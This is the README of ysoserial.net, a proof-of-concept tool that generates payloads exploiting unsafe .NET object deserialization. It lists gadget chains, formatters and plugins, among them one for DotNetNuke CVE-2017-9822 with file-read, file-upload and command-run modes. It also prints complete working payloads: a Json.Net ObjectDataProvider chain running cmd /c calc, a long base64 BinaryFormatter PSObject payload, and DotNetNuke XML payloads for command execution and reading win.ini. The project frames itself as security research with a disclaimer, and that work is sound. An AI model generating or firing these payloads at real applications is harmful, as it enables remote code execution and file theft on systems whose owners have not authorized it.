# ysoserial.net
[![Build Status](https://dev.azure.com/alvaro0284/ysoserial.net/_apis/build/status/pwntester.ysoserial.net?branchName=master)](https://dev.azure.com/alvaro0284/ysoserial.net/_build/latest?definitionId=1&branchName=master)

A proof-of-concept tool for generating payloads that exploit unsafe .NET object deserialization.

## Description
ysoserial.net is a collection of utilities and property-oriented programming "gadget chains" discovered in common .NET libraries that can, under the right conditions, exploit .NET applications performing unsafe deserialization of objects. The main driver program takes a user-specified command and wraps it in the user-specified gadget chain, then serializes these objects to stdout. When an application with the required gadgets on the classpath unsafely deserializes this data, the chain will automatically be invoked and cause the command to be executed on the application host.

It should be noted that the vulnerability lies in the application performing unsafe deserialization and NOT in having gadgets on the classpath.

This project is inspired by [Chris Frohoff's ysoserial project](https://github.com/frohoff/ysoserial)

## Disclaimer 
This software has been created purely for the purposes of academic research and for the development of effective defensive techniques, and is not intended to be used to attack systems except where explicitly authorized. Project maintainers are not responsible or liable for misuse of the software. Use responsibly.

This software is a personal project and not related with any companies, including Project owner and contributors employers.

## Usage
```
$ ./ysoserial -h
ysoserial.net generates deserialization payloads for a variety of .NET formatters.

Available formatters:
        ActivitySurrogateSelectorFromFile (ActivitySurrogateSelector gadget by James Forshaw. This gadget interprets the command parameter as path to the .cs file that should be compiled as exploit class. Use semicolon to separate the file from additionally required assemblies, e. g., '-c ExploitClass.cs;System.Windows.Forms.dll'.)
                Formatters:
                        BinaryFormatter
                        ObjectStateFormatter
                        SoapFormatter
                        LosFormatter
        ActivitySurrogateSelector (ActivitySurrogateSelector gadget by James Forshaw. This gadget ignores the command parameter and executes the constructor of ExploitClass class.)
                Formatters:
                        BinaryFormatter
                        ObjectStateFormatter
                        SoapFormatter
                        LosFormatter
        ObjectDataProvider (ObjectDataProvider Gadget by Oleksandr Mirosh and Alvaro Munoz)
                Formatters:
                        Xaml
                        Json.Net
                        FastJson
                        JavaScriptSerializer
                        XmlSerializer
                        DataContractSerializer
                        YamlDotNet < 5.0.0
        TextFormattingRunProperties (TextFormattingRunProperties Gadget by Oleksandr Mirosh and Alvaro Munoz.)
                Formatters:
                        BinaryFormatter
                        ObjectStateFormatter
                        SoapFormatter
                        NetDataContractSerializer
                        LosFormatter
        PSObject (PSObject Gadget by Oleksandr Mirosh and Alvaro Munoz. Target must run a system not patched for CVE-2017-8565 (Published: 07/11/2017))
                Formatters:
                        BinaryFormatter
                        ObjectStateFormatter
                        SoapFormatter
                        NetDataContractSerializer
                        LosFormatter
        TypeConfuseDelegate (TypeConfuseDelegate gadget by James Forshaw)
                Formatters:
                        BinaryFormatter
                        ObjectStateFormatter
                        NetDataContractSerializer
                        LosFormatter
        WindowsIdentity (WindowsIdentity Gadget by Levi Broderick)
                Formatters:
                        BinaryFormatter
                        Json.Net
                        DataContractSerializer

Available plugins:
        altserialization (Generates payload for HttpStaticObjectsCollection or SessionStateItemCollection)
        ApplicationTrust (Generates XML payload for the ApplicationTrust class)
        Clipboard (Generates payload for DataObject and copy it into the clipboard - ready to be pasted in affected apps)
        DotNetNuke (Generates payload for DotNetNuke CVE-2017-9822)
        Resx (Generates RESX files)
        SessionSecurityTokenHandler (Generates XML payload for the SessionSecurityTokenHandler class)
        TransactionManagerReenlist (Generates payload for the TransactionManager.Reenlist method)

Usage: ysoserial.exe [options]
Options:
  -p, --plugin=VALUE         the plugin to be used
  -o, --output=VALUE         the output format (raw|base64).
  -g, --gadget=VALUE         the gadget chain.
  -f, --formatter=VALUE      the formatter.
  -c, --command=VALUE        the command to be executed.
  -t, --test                 whether to run payload locally. Default: false
  -h, --help                 show this message and exit
```

*Note:* XmlSerializer and DataContractSerializer formatters generate a wrapper Xml format including the expected type on the "type" attribute of the root node, as used, for example, in DotNetNuke. You may need to modify the generated xml based on how XmlSerializer gets the expected type in your case.

## Plugins
Ysoserial.Net can be used to generate raw payloads or more complex ones using a plugin architecture. To use plugins, use `-p <plugin name>` followed by the plugin options (the rest of ysoserial.net options will be ignored). Eg:

```
$ ./ysoserial.exe -p DotNetNuke -m read_file -f win.ini
```

For more help on plugin options use `-h` along with `-p <plugin name>`. Eg:

```
$ ./ysoserial.exe -h -p DotNetNuke
ysoserial.net generates deserialization payloads for a variety of .NET formatters.

Plugin:

DotNetNuke (Generates payload for DotNetNuke CVE-2017-9822)

Options:

  -m, --mode=VALUE           the payload mode: read_file, upload_file, run_command.
  -c, --command=VALUE        the command to be executed in run_command mode.
  -u, --url=VALUE            the url to fetch the file from in write_file mode.
  -f, --file=VALUE           the file to read in read_file mode or the file to write to in write_file_mode.
```

## Examples

### Generate a **calc.exe** payload for Json.Net using *ObjectDataProvider* gadget.
```
$ ./ysoserial.exe -f Json.Net -g ObjectDataProvider -o raw -c "calc" -t
{
    '$type':'System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35',
    'MethodName':'Start',
    'MethodParameters':{
        '$type':'System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089',
        '$values':['cmd','/ccalc']
    },
    'ObjectInstance':{'$type':'System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089'}
}
```

### Generate a **calc.exe** payload for BinaryFormatter using *PSObject* gadget.
```
$ ./ysoserial.exe -f BinaryFormatter -g PSObject -o base64 -c "calc" -t
AAEAAAD/////AQAAAAAAAAAMAgAAAF9TeXN0ZW0uTWFuYWdlbWVudC5BdXRvbWF0aW9uLCBWZXJzaW9uPTMuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49MzFiZjM4NTZhZDM2NGUzNQUBAAAAJVN5c3RlbS5NYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNPYmplY3QBAAAABkNsaVhtbAECAAAABgMAAACJFQ0KPE9ianMgVmVyc2lvbj0iMS4xLjAuMSIgeG1sbnM9Imh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vcG93ZXJzaGVsbC8yMDA0LzA0Ij4mI3hEOw0KPE9iaiBSZWZJZD0iMCI+JiN4RDsNCiAgICA8VE4gUmVmSWQ9IjAiPiYjeEQ7DQogICAgICA8VD5NaWNyb3NvZnQuTWFuYWdlbWVudC5JbmZyYXN0cnVjdHVyZS5DaW1JbnN0YW5jZSNTeXN0ZW0uTWFuYWdlbWVudC5BdXRvbWF0aW9uL1J1bnNwYWNlSW52b2tlNTwvVD4mI3hEOw0KICAgICAgPFQ+TWljcm9zb2Z0Lk1hbmFnZW1lbnQuSW5mcmFzdHJ1Y3R1cmUuQ2ltSW5zdGFuY2UjUnVuc3BhY2VJbnZva2U1PC9UPiYjeEQ7DQogICAgICA8VD5NaWNyb3NvZnQuTWFuYWdlbWVudC5JbmZyYXN0cnVjdHVyZS5DaW1JbnN0YW5jZTwvVD4mI3hEOw0KICAgICAgPFQ+U3lzdGVtLk9iamVjdDwvVD4mI3hEOw0KICAgIDwvVE4+JiN4RDsNCiAgICA8VG9TdHJpbmc+UnVuc3BhY2VJbnZva2U1PC9Ub1N0cmluZz4mI3hEOw0KICAgIDxPYmogUmVmSWQ9IjEiPiYjeEQ7DQogICAgICA8VE5SZWYgUmVmSWQ9IjAiIC8+JiN4RDsNCiAgICAgIDxUb1N0cmluZz5SdW5zcGFjZUludm9rZTU8L1RvU3RyaW5nPiYjeEQ7DQogICAgICA8UHJvcHM+JiN4RDsNCiAgICAgICAgPE5pbCBOPSJQU0NvbXB1dGVyTmFtZSIgLz4mI3hEOw0KCQk8T2JqIE49InRlc3QxIiBSZWZJZCA9IjIwIiA+ICYjeEQ7DQogICAgICAgICAgPFROIFJlZklkPSIxIiA+ICYjeEQ7DQogICAgICAgICAgICA8VD5TeXN0ZW0uV2luZG93cy5NYXJrdXAuWGFtbFJlYWRlcltdLCBQcmVzZW50YXRpb25GcmFtZXdvcmssIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj0zMWJmMzg1NmFkMzY0ZTM1PC9UPiYjeEQ7DQogICAgICAgICAgICA8VD5TeXN0ZW0uQXJyYXk8L1Q+JiN4RDsNCiAgICAgICAgICAgIDxUPlN5c3RlbS5PYmplY3Q8L1Q+JiN4RDsNCiAgICAgICAgICA8L1ROPiYjeEQ7DQogICAgICAgICAgPExTVD4mI3hEOw0KICAgICAgICAgICAgPFMgTj0iSGFzaCIgPiAgDQoJCSZsdDtSZXNvdXJjZURpY3Rpb25hcnkNCiAgeG1sbnM9Imh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vd2luZngvMjAwNi94YW1sL3ByZXNlbnRhdGlvbiINCiAgeG1sbnM6eD0iaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS93aW5meC8yMDA2L3hhbWwiDQogIHhtbG5zOlN5c3RlbT0iY2xyLW5hbWVzcGFjZTpTeXN0ZW07YXNzZW1ibHk9bXNjb3JsaWIiDQogIHhtbG5zOkRpYWc9ImNsci1uYW1lc3BhY2U6U3lzdGVtLkRpYWdub3N0aWNzO2Fzc2VtYmx5PXN5c3RlbSImZ3Q7DQoJICZsdDtPYmplY3REYXRhUHJvdmlkZXIgeDpLZXk9IkxhdW5jaENhbGMiIE9iamVjdFR5cGUgPSAieyB4OlR5cGUgRGlhZzpQcm9jZXNzfSIgTWV0aG9kTmFtZSA9ICJTdGFydCIgJmd0Ow0KICAgICAmbHQ7T2JqZWN0RGF0YVByb3ZpZGVyLk1ldGhvZFBhcmFtZXRlcnMmZ3Q7DQogICAgICAgICZsdDtTeXN0ZW06U3RyaW5nJmd0O2NtZCZsdDsvU3lzdGVtOlN0cmluZyZndDsNCiAgICAgICAgJmx0O1N5c3RlbTpTdHJpbmcmZ3Q7L2MgImNhbGMiICZsdDsvU3lzdGVtOlN0cmluZyZndDsNCiAgICAgJmx0Oy9PYmplY3REYXRhUHJvdmlkZXIuTWV0aG9kUGFyYW1ldGVycyZndDsNCiAgICAmbHQ7L09iamVjdERhdGFQcm92aWRlciZndDsNCiZsdDsvUmVzb3VyY2VEaWN0aW9uYXJ5Jmd0Ow0KCQkJPC9TPiYjeEQ7DQogICAgICAgICAgPC9MU1Q+JiN4RDsNCiAgICAgICAgPC9PYmo+JiN4RDsNCiAgICAgIDwvUHJvcHM+JiN4RDsNCiAgICAgIDxNUz4mI3hEOw0KICAgICAgICA8T2JqIE49Il9fQ2xhc3NNZXRhZGF0YSIgUmVmSWQgPSIyIj4gJiN4RDsNCiAgICAgICAgICA8VE4gUmVmSWQ9IjEiID4gJiN4RDsNCiAgICAgICAgICAgIDxUPlN5c3RlbS5Db2xsZWN0aW9ucy5BcnJheUxpc3Q8L1Q+JiN4RDsNCiAgICAgICAgICAgIDxUPlN5c3RlbS5PYmplY3Q8L1Q+JiN4RDsNCiAgICAgICAgICA8L1ROPiYjeEQ7DQogICAgICAgICAgPExTVD4mI3hEOw0KICAgICAgICAgICAgPE9iaiBSZWZJZD0iMyI+ICYjeEQ7DQogICAgICAgICAgICAgIDxNUz4mI3hEOw0KICAgICAgICAgICAgICAgIDxTIE49IkNsYXNzTmFtZSI+UnVuc3BhY2VJbnZva2U1PC9TPiYjeEQ7DQogICAgICAgICAgICAgICAgPFMgTj0iTmFtZXNwYWNlIj5TeXN0ZW0uTWFuYWdlbWVudC5BdXRvbWF0aW9uPC9TPiYjeEQ7DQogICAgICAgICAgICAgICAgPE5pbCBOPSJTZXJ2ZXJOYW1lIiAvPiYjeEQ7DQogICAgICAgICAgICAgICAgPEkzMiBOPSJIYXNoIj40NjA5MjkxOTI8L0kzMj4mI3hEOw0KICAgICAgICAgICAgICAgIDxTIE49Ik1pWG1sIj4gJmx0O0NMQVNTIE5BTUU9IlJ1bnNwYWNlSW52b2tlNSIgJmd0OyZsdDtQUk9QRVJUWSBOQU1FPSJ0ZXN0MSIgVFlQRSA9InN0cmluZyIgJmd0OyZsdDsvUFJPUEVSVFkmZ3Q7Jmx0Oy9DTEFTUyZndDs8L1M+JiN4RDsNCiAgICAgICAgICAgICAgPC9NUz4mI3hEOw0KICAgICAgICAgICAgPC9PYmo+JiN4RDsNCiAgICAgICAgICA8L0xTVD4mI3hEOw0KICAgICAgICA8L09iaj4mI3hEOw0KICAgICAgPC9NUz4mI3hEOw0KICAgIDwvT2JqPiYjeEQ7DQogICAgPE1TPiYjeEQ7DQogICAgICA8UmVmIE49Il9fQ2xhc3NNZXRhZGF0YSIgUmVmSWQgPSIyIiAvPiYjeEQ7DQogICAgPC9NUz4mI3hEOw0KICA8L09iaj4mI3hEOw0KPC9PYmpzPgs=
```

### Generate a run_command payload for DotNetNuke using its plugin
```
$ ./ysoserial.exe -p DotNetNuke -M run_command -C calc.exe
<profile><item key="foo" type="System.Data.Services.Internal.ExpandedWrapper`2[[System.Web.UI.ObjectStateFormatter, System.Web, Version = 4.0.0.0, Culture = neutral, PublicKeyToken = b03f5f7f11d50a3a],[System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]], System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"><ExpandedWrapperOfObjectStateFormatterObjectDataProvider xmlns:xsd=" [http://www.w3.org/2001/XMLSchema](http://www.w3.org/2001/XMLSchema) " xmlns:xsi=" [http://www.w3.org/2001/XMLSchema-instance](http://www.w3.org/2001/XMLSchema-instance) "><ExpandedElement/><ProjectedProperty0><MethodName>Deserialize</MethodName><MethodParameters><anyType xsi:type="xsd:string">/wEyxBEAAQAAAP////8BAAAAAAAAAAwCAAAASVN5c3RlbSwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODkFAQAAAIQBU3lzdGVtLkNvbGxlY3Rpb25zLkdlbmVyaWMuU29ydGVkU2V0YDFbW1N5c3RlbS5TdHJpbmcsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV1dBAAAAAVDb3VudAhDb21wYXJlcgdWZXJzaW9uBUl0ZW1zAAMABgiNAVN5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLkNvbXBhcmlzb25Db21wYXJlcmAxW1tTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQgCAAAAAgAAAAkDAAAAAgAAAAkEAAAABAMAAACNAVN5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLkNvbXBhcmlzb25Db21wYXJlcmAxW1tTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQEAAAALX2NvbXBhcmlzb24DIlN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xkZXIJBQAAABEEAAAAAgAAAAYGAAAACy9jIGNhbGMuZXhlBgcAAAADY21kBAUAAAAiU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcgMAAAAIRGVsZWdhdGUHbWV0aG9kMAdtZXRob2QxAwMDMFN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xkZXIrRGVsZWdhdGVFbnRyeS9TeXN0ZW0uUmVmbGVjdGlvbi5NZW1iZXJJbmZvU2VyaWFsaXphdGlvbkhvbGRlci9TeXN0ZW0uUmVmbGVjdGlvbi5NZW1iZXJJbmZvU2VyaWFsaXphdGlvbkhvbGRlcgkIAAAACQkAAAAJCgAAAAQIAAAAMFN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xkZXIrRGVsZWdhdGVFbnRyeQcAAAAEdHlwZQhhc3NlbWJseQZ0YXJnZXQSdGFyZ2V0VHlwZUFzc2VtYmx5DnRhcmdldFR5cGVOYW1lCm1ldGhvZE5hbWUNZGVsZWdhdGVFbnRyeQEBAgEBAQMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcitEZWxlZ2F0ZUVudHJ5BgsAAACwAlN5c3RlbS5GdW5jYDNbW1N5c3RlbS5TdHJpbmcsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV0sW1N5c3RlbS5TdHJpbmcsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV0sW1N5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzLCBTeXN0ZW0sIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0GDAAAAEttc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODkKBg0AAABJU3lzdGVtLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OQYOAAAAGlN5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzBg8AAAAFU3RhcnQJEAAAAAQJAAAAL1N5c3RlbS5SZWZsZWN0aW9uLk1lbWJlckluZm9TZXJpYWxpemF0aW9uSG9sZGVyBwAAAAROYW1lDEFzc2VtYmx5TmFtZQlDbGFzc05hbWUJU2lnbmF0dXJlClNpZ25hdHVyZTIKTWVtYmVyVHlwZRBHZW5lcmljQXJndW1lbnRzAQEBAQEAAwgNU3lzdGVtLlR5cGVbXQkPAAAACQ0AAAAJDgAAAAYUAAAAPlN5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzIFN0YXJ0KFN5c3RlbS5TdHJpbmcsIFN5c3RlbS5TdHJpbmcpBhUAAAA+U3lzdGVtLkRpYWdub3N0aWNzLlByb2Nlc3MgU3RhcnQoU3lzdGVtLlN0cmluZywgU3lzdGVtLlN0cmluZykIAAAACgEKAAAACQAAAAYWAAAAB0NvbXBhcmUJDAAAAAYYAAAADVN5c3RlbS5TdHJpbmcGGQAAACtJbnQzMiBDb21wYXJlKFN5c3RlbS5TdHJpbmcsIFN5c3RlbS5TdHJpbmcpBhoAAAAyU3lzdGVtLkludDMyIENvbXBhcmUoU3lzdGVtLlN0cmluZywgU3lzdGVtLlN0cmluZykIAAAACgEQAAAACAAAAAYbAAAAcVN5c3RlbS5Db21wYXJpc29uYDFbW1N5c3RlbS5TdHJpbmcsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV1dCQwAAAAKCQwAAAAJGAAAAAkWAAAACgs=</anyType></MethodParameters><ObjectInstance xsi:type="ObjectStateFormatter"></ObjectInstance></ProjectedProperty0></ExpandedWrapperOfObjectStateFormatterObjectDataProvider></item></profile>
```

### Generate a read_file payload for DotNetNuke using its plugin
```
$ ./ysoserial.exe -p DotNetNuke -m read_file -f win.ini
<profile><item key="name1: key1" type="System.Data.Services.Internal.ExpandedWrapper`2[[DotNetNuke.Common.Utilities.FileSystemUtils],[System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]], System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"><ExpandedWrapperOfFileSystemUtilsObjectDataProvider xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><ExpandedElement/><ProjectedProperty0><MethodName>WriteFile</MethodName><MethodParameters><anyType xsi:type="xsd:string">win.ini</anyType></MethodParameters><ObjectInstance xsi:type="FileSystemUtils"></ObjectInstance></ProjectedProperty0></ExpandedWrapperOfFileSystemUtilsObjectDataProvider></item></profile>
```

## Contributing
- Fork it
- Create your feature branch (`git checkout -b my-new-feature`)
- Commit your changes (`git commit -am 'Add some feature'`)
- Push to the branch (`git push origin my-new-feature`)
- Create new Pull Request

## Thanks
Special thanks to all contributors:
- [irsdl](https://github.com/irsdl)
- [JarLob](https://github.com/JarLob)
- [DS-Kurt-Boberg](https://github.com/DS-Kurt-Boberg)
- [mwulftange](https://github.com/mwulftange)
- [yallie](https://github.com/yallie)
- [paralax](https://github.com/paralax)

## Additional Reading
- [Attacking .NET serialization](https://speakerdeck.com/pwntester/attacking-net-serialization)
- [Friday the 13th: JSON Attacks - Slides](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf)
- [Friday the 13th: JSON Attacks - Whitepaper](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf)
- [Friday the 13th: JSON Attacks - Video(demos)](https://www.youtube.com/watch?v=ZBfBYoK_Wr0)
- [Are you my Type?](https://media.blackhat.com/bh-us-12/Briefings/Forshaw/BH_US_12_Forshaw_Are_You_My_Type_Slides.pdf)
- [Exploiting .NET Managed DCOM](https://googleprojectzero.blogspot.com.es/2017/04/exploiting-net-managed-dcom.html)
